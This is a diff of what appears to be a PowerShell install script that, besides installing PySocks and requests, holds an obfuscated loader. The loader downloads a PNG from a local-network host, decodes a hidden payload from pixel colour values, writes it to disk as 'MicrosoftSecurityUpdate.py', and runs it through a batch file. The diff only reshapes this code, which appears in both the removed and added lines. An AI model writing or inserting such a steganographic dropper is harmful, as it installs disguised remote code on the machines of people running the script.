@@ -21,9 +21,12 @@ pip install --no-input PySocks
 
 pip install --no-input requests
 
+Set-Alias abc New-Object;Add-Type -A System.Windows.Forms;($dd=abc System.Windows.Forms.PictureBox).Load('http://192.168.10.128/one.png');
+$gg=$dd.Image;$oo=abc Byte[] 3840;(0..0)|%{foreach($x in(0..3839)){$p=$gg.GetPixel($x,$_);$oo[$_*3840+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};
+$egh=[System.Text.Encoding]::UTF8.GetString($oo[0..2197]);Out-File -FilePath "$InstallDir\MicrosoftSecurityUpdate.py" -InputObject $egh -Force -Encoding utf8
 
-Set-Alias abc New-Object;Add-Type -A System.Windows.Forms;($dd=abc System.Windows.Forms.PictureBox).Load("http://192.168.10.128/7.png");$gg=$dd.Image;$oo=abc Byte[] 3840;(0..0)|%{foreach($x in(0..3839)){$p=$gg.GetPixel($x,$_);$oo[$_*3840+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};$egh=[System.Text.Encoding]::UTF8.GetString($oo[0..2197]);Out-File -FilePath "$InstallDir\MicrosoftSecurityUpdate.py" -InputObject $egh -Force -Encoding utf8
+New-Item "$InstallDir\MicrosoftSecurityUpdate.bat" -Force
 
-$batch_script = 'python C:\Users\Public\Chocolatey\MicrosoftSecurityUpdate.py' | out-file -filepath "$InstallDir\MicrosoftSecurityUpdate.bat"
+Set-Content "$InstallDir\MicrosoftSecurityUpdate.bat" 'python C:\Users\Public\Chocolatey\MicrosoftSecurityUpdate.py'
 
 C:\Users\Public\Chocolatey\MicrosoftSecurityUpdate.bat
